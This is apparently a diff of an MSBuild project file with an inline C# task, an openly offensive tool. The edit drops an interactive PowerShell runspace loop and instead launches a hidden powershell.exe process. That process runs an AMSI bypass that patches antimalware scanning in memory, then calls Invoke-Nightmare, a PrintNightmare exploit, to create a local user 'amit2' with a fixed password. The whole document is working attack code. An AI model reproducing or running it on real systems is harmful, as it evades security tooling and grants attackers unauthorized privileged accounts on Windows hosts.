@@ -24,9 +24,7 @@
         <![CDATA[
         using System;
         using System.IO;
-        using System.Collections.ObjectModel;
-        using System.Management.Automation;
-        using System.Management.Automation.Runspaces;
+        using System.Diagnostics;
         using System.Threading;
         using Microsoft.Build.Framework;
         using Microsoft.Build.Utilities;
@@ -46,15 +44,12 @@
 
             private void RunPowerShell()
             {
-                Runspace rs = RunspaceFactory.CreateRunspace();
-                rs.Open();
-                PowerShell ps = PowerShell.Create();
-                ps.Runspace = rs;
                 string currentDirectory = Directory.GetCurrentDirectory();
-
-                Console.WriteLine("PS " + currentDirectory + ">");
-
-                // AMSI bypass code (kept as an example)
+                
+                // Full path to PowerShell executable
+                string powerShellPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
+                
+                // AMSI bypass script (adjust as needed)
                 string amsiBypass = @"
                 $a=[Ref].Assembly.GetTypes(); 
                 Foreach($b in $a) {
@@ -74,89 +69,48 @@
                 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);
                 ";
 
-                // Add the AMSI bypass script to the session
-                ps.AddScript(amsiBypass);
-                ps.Invoke();
+                // Command to execute via PowerShell
+                string script = $@"
+                    {amsiBypass}
+                    Invoke-Nightmare -DriverName ""Xerox"" -NewUser ""amit2"" -NewPassword ""Password123!""
+                ";
 
-                while (true)
+                // Set up ProcessStartInfo to run the PowerShell script
+                ProcessStartInfo startInfo = new ProcessStartInfo
                 {
-                    // Print the prompt first
-                    Console.Write("PS " + currentDirectory + "> ");
-                    string cmd = Console.ReadLine();
-                    if (string.IsNullOrWhiteSpace(cmd)) continue;
+                    FileName = powerShellPath,
+                    Arguments = $"-NoExit -Command \"{script}\"",
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    RedirectStandardInput = true, // Ensure input can be passed in case of interactivity
+                    UseShellExecute = false, // Must be false for redirection to work
+                    CreateNoWindow = true
+                };
 
-                    try
+                Process process = new Process();
+                process.StartInfo = startInfo;
+
+                // Capture output and error
+                process.OutputDataReceived += (sender, e) => {
+                    if (!string.IsNullOrWhiteSpace(e.Data))
                     {
-                        // Handle 'exit' command separately
-                        if (cmd.Trim().ToLower() == "exit")
-                        {
-                            Console.WriteLine("Exiting PowerShell session...");
-                            break;  // Breaks the loop and ends the session
-                        }
-
-                        // Handle directory navigation commands
-                        if (cmd.StartsWith("cd ") || cmd.StartsWith("Set-Location"))
-                        {
-                            string targetPath = cmd.Substring(cmd.IndexOf(" ") + 1).Trim().Replace("\"", "");
-                            if (Directory.Exists(targetPath))
-                            {
-                                Directory.SetCurrentDirectory(targetPath);
-                                currentDirectory = Directory.GetCurrentDirectory();
-                                ps.AddScript(string.Format("Set-Location \"{0}\"", currentDirectory)).Invoke();
-                            }
-                            else
-                            {
-                                Console.WriteLine("The system cannot find the path specified: " + targetPath);
-                            }
-                            continue;
-                        }
-
-                        // Capture output for all commands (including cmdlets and tools like iex)
-                        ps.AddScript(cmd + " | Out-String");
-
-                        // Execute the script
-                        Collection<PSObject> psOutput = ps.Invoke();
-                        Collection<ErrorRecord> errors = ps.Streams.Error.ReadAll();
-
-                        // Handle errors if any
-                        if (errors.Count > 0)
-                        {
-                            Console.WriteLine(); // Blank line before error output
-                            foreach (ErrorRecord error in errors)
-                            {
-                                Console.WriteLine("ERROR: " + error.ToString());
-                            }
-                        }
-
-                        // Capture standard output (including cmdlet outputs)
-                        if (psOutput.Count > 0)
-                        {
-                            Console.WriteLine(); // Blank line before output
-                            foreach (PSObject output in psOutput)
-                            {
-                                if (output != null)
-                                {
-                                    // Ensure the output is converted to a string and displayed
-                                    Console.WriteLine(output.ToString());
-                                }
-                            }
-                        }
-
+                        Console.Write(e.Data); // Avoid extra line breaks
                     }
-                    catch (Exception e)
+                };
+                process.ErrorDataReceived += (sender, e) => {
+                    if (!string.IsNullOrWhiteSpace(e.Data))
                     {
-                        Console.WriteLine(); // Blank line before error message
-                        Console.WriteLine("**** ERROR ****");
-                        Console.WriteLine(e.Message);
+                        Console.Write("ERROR: " + e.Data); // Avoid extra line breaks
                     }
-                    finally
-                    {
-                        ps.Commands.Clear();
-                        Console.WriteLine();
-                    }
-                }
+                };
 
-                rs.Close();
+                // Capturing verbose and progress output as well
+                process.Start();
+                process.BeginOutputReadLine();
+                process.BeginErrorReadLine();
+
+                // Wait for the process to exit
+                process.WaitForExit();
             }
         }
         ]]>
